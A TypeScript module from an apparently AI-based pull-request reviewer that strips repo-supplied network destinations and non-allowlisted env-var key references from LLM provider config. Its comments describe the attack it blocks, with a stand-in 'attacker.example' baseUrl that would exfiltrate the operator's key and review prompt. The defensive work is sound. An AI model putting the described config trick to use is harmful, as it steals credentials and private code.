/**
 * Strip PR-controlled network destinations from a config-file LLM provider map.
 *
 * `.opencode-reviewer.yml` is read from the PR branch, so every network
 * destination in it is attacker-controlled. A provider entry naming
 * `baseUrl: https://attacker.example/v1` survives `loadConfig` validation —
 * `baseUrl`, `endpoint` and `resourceName` are all on its allowlist — and
 * `mergeEnvProviderEntry` then fills the *operator's* `apiKey` into that same
 * entry, because it only overwrites keys the repo left unset. The result is the
 * operator's LLM key plus the entire review prompt (full diff and the contents
 * of every file the reviewer read) delivered to a host the PR author chose.
 *
 * The action path has always done this in `buildLLMConfig`. This module exists
 * so the app path can do the same thing from one implementation: the asymmetry
 * between the two wrappers is what let the app ship without a guard, and a
 * second hand-written copy is how that asymmetry would come back.
 */
import type { LLMProviderConfig } from '../types/index.js';
import { isAllowedLLMRef, parseLLMEnvRef } from './llm-refs.js';

/**
 * Drop `baseUrl` / `endpoint` / `resourceName` from every provider entry, plus
 * any `apiKey` that is an `{env:VAR}` reference naming a variable outside the
 * `LLM_REF_ALLOWLIST` in `llm-refs.ts`.
 *
 * Non-network fields (`type`, `model`, `models`, `apiVersion`, `deployment`,
 * `modelId`, `region`, `npm`, timeouts) are preserved, so a repo can still
 * declare which model it wants to be reviewed with — only the destination is
 * operator-controlled. `apiKey` is preserved too, but only as a literal value:
 * "only the destination is operator-controlled" does not hold for the
 * `{env:VAR}` form, because resolving a repo-supplied reference materializes an
 * arbitrary reader of the operator's process environment (that is what makes
 * the `applyLLMEnvOverrides` reference path reachable). Closing it here as well
 * as at the consumer means the reference cannot be revived by a new caller.
 * @param providers - Provider map as parsed from the repo config file.
 * @param onWarn - Called once per provider that had a destination stripped.
 * @param onApiKeyRefWarn - Called once per provider whose `apiKey` reference
 *   was dropped because it names a non-allowlisted variable.
 * @returns A new provider map, or `undefined` when the input is absent.
 */
export function stripUntrustedProviderEndpoints(
  providers: Record<string, LLMProviderConfig> | undefined,
  onWarn?: (providerId: string) => void,
  onApiKeyRefWarn?: (providerId: string, refName: string) => void,
): Record<string, LLMProviderConfig> | undefined {
  if (!providers || typeof providers !== 'object') return providers;

  const result: Record<string, LLMProviderConfig> = {};
  for (const [id, entry] of Object.entries(providers)) {
    if (!entry || typeof entry !== 'object') {
      if (entry !== undefined) result[id] = entry;
      continue;
    }
    const { baseUrl, endpoint, resourceName, apiKey, ...rest } = entry as LLMProviderConfig & {
      baseUrl?: string;
      endpoint?: string;
      resourceName?: string;
      apiKey?: string;
    };
    if (baseUrl !== undefined || endpoint !== undefined || resourceName !== undefined) {
      onWarn?.(id);
    }
    const apiKeyRef = parseLLMEnvRef(apiKey);
    if (apiKey !== undefined && apiKeyRef !== undefined && !isAllowedLLMRef(apiKeyRef)) {
      // Drop the whole key rather than the reference: leaving `{env:DATABASE_URL}`
      // in place would still be expanded by anything that resolves it, and a
      // literal is never a reference. Fail closed — the operator's env var
      // supplies the credential instead.
      onApiKeyRefWarn?.(id, apiKeyRef);
      result[id] = { ...(rest as LLMProviderConfig) };
      continue;
    }
    result[id] = { ...(rest as LLMProviderConfig), ...(apiKey !== undefined ? { apiKey } : {}) };
  }
  return result;
}
